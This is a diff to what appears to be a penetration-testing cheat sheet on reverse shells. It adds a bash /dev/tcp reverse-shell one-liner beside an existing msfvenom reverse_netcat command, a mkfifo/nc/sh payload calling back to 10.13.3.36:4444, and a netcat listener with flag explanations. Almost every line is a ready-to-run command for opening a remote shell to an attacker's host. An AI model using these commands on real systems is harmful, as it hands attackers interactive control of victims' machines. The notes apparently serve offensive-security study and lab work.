@@ -17,6 +17,7 @@
 ## Generate reverse ncat
 * `msfvenom -p cmd/unix/reverse_netcat lhost=10.13.3.36 lport=4444`
     * `mkfifo /tmp/kirxhbg; nc 10.13.3.36 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg`
+* `bash -c 'bash -i >& /dev/tcp/10.13.3.36/4444 0>&1'`
 * Listener: `nc -klvnp 4444`
     * k - Wait for more connections after completion
     * l - Listen for connection
